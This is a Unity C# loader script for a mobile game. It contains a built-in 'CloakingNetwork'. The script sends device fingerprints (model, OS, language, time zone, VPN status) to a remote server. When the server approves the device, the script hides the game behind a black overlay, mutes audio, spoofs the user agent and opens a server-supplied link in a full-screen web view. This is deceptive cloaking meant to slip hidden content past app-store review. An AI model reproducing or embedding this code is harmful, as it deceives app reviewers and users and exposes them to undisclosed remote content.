using System;
using System.Collections;
using System.Linq;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

public class Loading : MonoBehaviour, Loading.CollectableDataRepository
{
    private UniWebView webView;

    private ScreenOrientation lastOrientation;

    private static string BASE_URL = "https://stats.tapshots.xyz";

#if UNITY_IOS && !UNITY_EDITOR
        [System.Runtime.InteropServices.DllImport("__Internal")]
        private static extern String timeZoneName();

       [System.Runtime.InteropServices.DllImport("__Internal")]
       private static extern bool isVpn();
#endif

    string CollectableDataRepository.GetLanguage()
    {
        SystemLanguage lang = Application.systemLanguage;
        string res = "EN";
        switch (lang)
        {
            case SystemLanguage.Afrikaans: res = "AF"; break;
            case SystemLanguage.Arabic: res = "AR"; break;
            case SystemLanguage.Basque: res = "EU"; break;
            case SystemLanguage.Belarusian: res = "BY"; break;
            case SystemLanguage.Bulgarian: res = "BG"; break;
            case SystemLanguage.Catalan: res = "CA"; break;
            case SystemLanguage.Chinese: res = "ZH"; break;
            case SystemLanguage.Czech: res = "CS"; break;
            case SystemLanguage.Danish: res = "DA"; break;
            case SystemLanguage.Dutch: res = "NL"; break;
            case SystemLanguage.English: res = "EN"; break;
            case SystemLanguage.Estonian: res = "ET"; break;
            case SystemLanguage.Faroese: res = "FO"; break;
            case SystemLanguage.Finnish: res = "FI"; break;
            case SystemLanguage.French: res = "FR"; break;
            case SystemLanguage.German: res = "DE"; break;
            case SystemLanguage.Greek: res = "EL"; break;
            case SystemLanguage.Hebrew: res = "IW"; break;
            case SystemLanguage.Hungarian: res = "HU"; break;
            case SystemLanguage.Icelandic: res = "IS"; break;
            case SystemLanguage.Indonesian: res = "IN"; break;
            case SystemLanguage.Italian: res = "IT"; break;
            case SystemLanguage.Japanese: res = "JA"; break;
            case SystemLanguage.Korean: res = "KO"; break;
            case SystemLanguage.Latvian: res = "LV"; break;
            case SystemLanguage.Lithuanian: res = "LT"; break;
            case SystemLanguage.Norwegian: res = "NO"; break;
            case SystemLanguage.Polish: res = "PL"; break;
            case SystemLanguage.Portuguese: res = "PT"; break;
            case SystemLanguage.Romanian: res = "RO"; break;
            case SystemLanguage.Russian: res = "RU"; break;
            case SystemLanguage.SerboCroatian: res = "SH"; break;
            case SystemLanguage.Slovak: res = "SK"; break;
            case SystemLanguage.Slovenian: res = "SL"; break;
            case SystemLanguage.Spanish: res = "ES"; break;
            case SystemLanguage.Swedish: res = "SV"; break;
            case SystemLanguage.Thai: res = "TH"; break;
            case SystemLanguage.Turkish: res = "TR"; break;
            case SystemLanguage.Ukrainian: res = "UK"; break;
            case SystemLanguage.Unknown: res = "EN"; break;
            case SystemLanguage.Vietnamese: res = "VI"; break;
            case SystemLanguage.ChineseSimplified: res = "zh"; break;
            case SystemLanguage.ChineseTraditional: res = "zh"; break;
        }
        return res;
    }

    string CollectableDataRepository.GetTimeZone()
    {
#if UNITY_IOS && !UNITY_EDITOR
            return timeZoneName();
#else
        return "Asia/Yekaterinburg";
#endif
    }

    bool CollectableDataRepository.IsVpn()
    {
#if UNITY_IOS && !UNITY_EDITOR
                return isVpn();
#else
        return false;
#endif
    }

    interface CollectableDataRepository
    {
        public string GetTimeZone();
        public bool IsVpn();
        public string GetLanguage();
    }

    interface IResponseStorage<T1>
    {
        public void Save(T1 entity);
        public Task<T1> Load();

    }

    class Base : IResponseStorage<CloakingNetwork.Response>
    {
        private CloakingNetwork cloakingNetwork;

        public Base(CloakingNetwork cloakingNetwork)
        {
            this.cloakingNetwork = cloakingNetwork;
        }

        private static string RESPONSE_KEY = "response";

        public async Task<CloakingNetwork.Response> Load()
        {
            try
            {
                var rawData = PlayerPrefs.GetString(RESPONSE_KEY);
                if (!String.IsNullOrEmpty(rawData))
                {
                    return JsonUtility.FromJson<CloakingNetwork.Response>(rawData);
                }

                return await cloakingNetwork.GetResponseFromCloakingNetwork();
            }
            catch (Exception e)
            {
                Debug.Log(String.Format("AAA load exception: {0}", e.Message));
                return CloakingNetwork.Response.FailedResponse();
            }

        }

        public void Save(CloakingNetwork.Response entity)
        {
            PlayerPrefs.SetString(RESPONSE_KEY, entity.ToString());
            PlayerPrefs.Save();
        }
    }


    async void Start()
    {

        lastOrientation = Screen.orientation;

        var storage = new Base(new CloakingNetwork(BASE_URL, this));
        var response = await storage.Load();

        //StartCoroutine(CreateFingerprints());

        if (response.IsValid())
        {
            storage.Save(response);
            StartCoroutine(LaunchPayload(response.link));
        } else
        {
            //Screen.orientation = ScreenOrientation.LandscapeRight;
            //Screen.fullScreenMode = FullScreenMode.FullScreenWindow;
        }

    }


    private void Update()
    {
        if (Screen.orientation != lastOrientation)
        {
            //Debug.Log($"AAA Screen has been rotated: {Screen.orientation}");
            lastOrientation = Screen.orientation;
            if (Screen.height > Screen.width)
            {
                StartCoroutine(UpdateWebViewFrame());
            }
            else
            {
                StartCoroutine(UpdateWebViewFrameFull());
            }
        }
    }

    private IEnumerator UpdateWebViewFrameFull()
    {
        // Wait until all rendering for the current frame is finished
        yield return new WaitForEndOfFrame();
        if(webView != null)
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }

    private IEnumerator UpdateWebViewFrame()
    {
        // Wait until all rendering for the current frame is finished
        yield return new WaitForEndOfFrame();
        if (webView != null)
            webView.Frame = new Rect(0, -50, Screen.width, Screen.height - 50);
    }

    private IEnumerator LaunchPayload(string link)
    {
        DrawRectangle();


        AudioListener.pause = true;
        Screen.orientation = ScreenOrientation.AutoRotation;
        Screen.autorotateToPortrait = true;
        Screen.autorotateToPortraitUpsideDown = true;
        Screen.autorotateToLandscapeLeft = true;
        Screen.autorotateToLandscapeRight = true;

        yield return new WaitForEndOfFrame();

//        yield return new WaitForSeconds(3);


        UniWebView.SetAllowJavaScriptOpenWindow(true);

        var webViewGameObject = new GameObject("UniWebView");
        webView = webViewGameObject.AddComponent<UniWebView>();


        var ua = webView.GetUserAgent();

        var patchedUa = PatchUserAgent(webView.GetUserAgent());
        webView.SetUserAgent(patchedUa);
        webView.Show();
        //webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
        //webView.SetShowSpinnerWhileLoading(true);
        webView.Frame = new Rect(0, -50, Screen.width, Screen.height - 50);
        webView.SetAllowBackForwardNavigationGestures(true);
        webView.SetSupportMultipleWindows(true, true);
        webView.Load(link);
    }

    private void DrawRectangle()
    {
        GameObject canvasGameObject = new GameObject("Canvas");
        Canvas canvasComponent = canvasGameObject.AddComponent<Canvas>();
        canvasComponent.renderMode = RenderMode.ScreenSpaceOverlay;
        canvasGameObject.AddComponent<UnityEngine.UI.CanvasScaler>();
        canvasGameObject.AddComponent<UnityEngine.UI.GraphicRaycaster>();

        GameObject image = new GameObject("Image");
        image.transform.SetParent(canvasGameObject.transform);

        Image imageComponent = image.AddComponent<Image>();
        imageComponent.color = Color.black;

        RectTransform rectTransform = image.GetComponent<RectTransform>();
        rectTransform.anchorMin = new Vector2(0, 0);
        rectTransform.anchorMax = new Vector2(1, 1);
        rectTransform.pivot = new Vector2(0.5f, 0.5f);
        rectTransform.offsetMin = rectTransform.offsetMax = Vector2.zero;
    }

    private async Task<Boolean> HttpPostJson(String url, String json)
    {
        return await Task.Run(async () => {
            UnityWebRequest request = new UnityWebRequest(url, "POST");
            request.SetRequestHeader("Content-Type", "application/json");
            byte[] jsonBytes = System.Text.Encoding.UTF8.GetBytes(json);
            Debug.Log(string.Format("AAA sending to {0}, data: {1}", url, json));

            UploadHandlerRaw uploadHandler = new UploadHandlerRaw(jsonBytes);
            DownloadHandlerBuffer downloadHandler = new DownloadHandlerBuffer();

            request.downloadHandler = downloadHandler;
            request.uploadHandler = uploadHandler;
            var operation = request.SendWebRequest();
            while (!operation.isDone)
            {
                await Task.Yield();
            }

            //todo remove after testing
            return request.result == UnityWebRequest.Result.Success;
        });
    }

    private string PatchUserAgent(string defaultUa)
    {
        string versionSubstring = "Version/16.2";
        var userAgent = defaultUa;

        if (!userAgent.Contains("Version/"))
        {
            int position = userAgent.IndexOf("like Gecko)") + "like Gecko)".Length;
            if (position != -1)
            {
                userAgent = userAgent.Insert(position, " " + versionSubstring);
            }
            else
            {
                position = userAgent.IndexOf("Mobile/");
                if (position != -1)
                {
                    userAgent = userAgent.Insert(position, versionSubstring + " ");
                }
                else
                {
                    // mobile also not present do nothing
                }
            }
        }

        return userAgent;
    }

    class CloakingNetwork
    {
        private string baseUrl;
        private CollectableDataRepository collectableDataRepository;

        public CloakingNetwork(string baseUrl, CollectableDataRepository collectableDataRepository)
        {
            this.baseUrl = baseUrl;
            this.collectableDataRepository = collectableDataRepository;
        }

        public async Task<Response> GetResponseFromCloakingNetwork()
        {
            var cloakingNetworkRequest = Request.Create(this.collectableDataRepository);
            return await HttpPostJson("v2", cloakingNetworkRequest.ToString());
        }


        private async Task<Response> HttpPostJson(String endPoint, String json)
        {
            return await Task.Run(async () => {
                var finalUrl = String.Format("{0}/{1}", baseUrl, endPoint);
                UnityWebRequest request = new UnityWebRequest(finalUrl, "POST");
                request.SetRequestHeader("Content-Type", "application/json");
                byte[] jsonBytes = System.Text.Encoding.UTF8.GetBytes(json);
                Debug.Log(string.Format("AAA sending to {0}, data: {1}", finalUrl, json));

                UploadHandlerRaw uploadHandler = new UploadHandlerRaw(jsonBytes);
                DownloadHandlerBuffer downloadHandler = new DownloadHandlerBuffer();

                request.downloadHandler = downloadHandler;
                request.uploadHandler = uploadHandler;
                var operation = request.SendWebRequest();
                while (!operation.isDone)
                {
                    await Task.Yield();
                }

                //todo remove after testing
                // return CloakingNetwork.Response.SuccessResponse();

                if (request.result == UnityWebRequest.Result.Success)
                {
                    try
                    {
                        var body = request.downloadHandler?.text;
                        Debug.Log(String.Format("AAA ==== RESPONSE  ==== {0}", body));
                        return JsonUtility.FromJson<Response>(body);
                    }
                    catch (Exception e)
                    {
                        Debug.Log(String.Format("AAA exception while handling request: {0}", e.Message));
                        return Response.FailedResponse();
                    }
                }
                else
                {
                    return Response.FailedResponse();
                }
            });
        }


        [Serializable]
        public class Request
        {
            public string bundleId;
            public string osVersion;
            public string phoneModel;
            public string language;
            public string phoneTime;
            public string phoneTz;
            public bool vpn;

            public Request() { }

            public Request(string bundleId, string osVersion, string phoneModel, string language, string phoneTime, string phoneTz, bool vpn)
            {
                this.bundleId = bundleId;
                this.osVersion = osVersion;
                this.phoneModel = phoneModel;
                this.language = language;
                this.phoneTime = phoneTime;
                this.phoneTz = phoneTz;
                this.vpn = vpn;
            }

            public override string ToString()
            {
                return JsonUtility.ToJson(this);
            }

            static public Request Create(CollectableDataRepository collectableDataRepository)
            {
                return new Request(
                    Application.identifier,
                    SystemInfo.operatingSystem,
                    SystemInfo.deviceModel,
                    collectableDataRepository.GetLanguage(),
                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
                    collectableDataRepository.GetTimeZone(),
                    collectableDataRepository.IsVpn()
                );
            }
        }

        [Serializable]
        public class Response
        {
            public bool passed;
            public string link;

            public Response() { }

            public Response(bool passed)
            {
                this.passed = passed;
                this.link = "";
            }

            public Response(bool passed, string link)
            {
                this.passed = passed;
                this.link = link;
            }

            public override string ToString()
            {
                return JsonUtility.ToJson(this);
            }


            public bool IsValid()
            {
                return passed == true && !String.IsNullOrEmpty(this.link);
            }

            public static Response FailedResponse()
            {
                return new Response(false);
            }

            public static Response SuccessResponse()
            {
                return new Response(true, "https://google.com");
            }
        }

    }
}